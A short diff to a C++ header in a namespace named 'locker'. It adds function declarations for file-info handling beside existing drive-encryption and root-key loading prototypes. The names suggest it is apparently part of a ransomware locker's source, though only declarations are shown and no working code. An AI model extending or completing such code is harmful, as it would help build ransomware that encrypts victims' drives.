@@ -149,8 +149,10 @@ namespace locker
 	bool GeneratePolicy(CRYPT_INFO* CryptInfo);
 	void CryptoSystemInit(CRYPTO_SYSTEM* sys);
 
+	bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo);
+	void free_file_info(PFILE_INFO FileInfo, bool success);
 	bool HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data);
-
+	
 	void LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
 	void LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
 	void LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV);
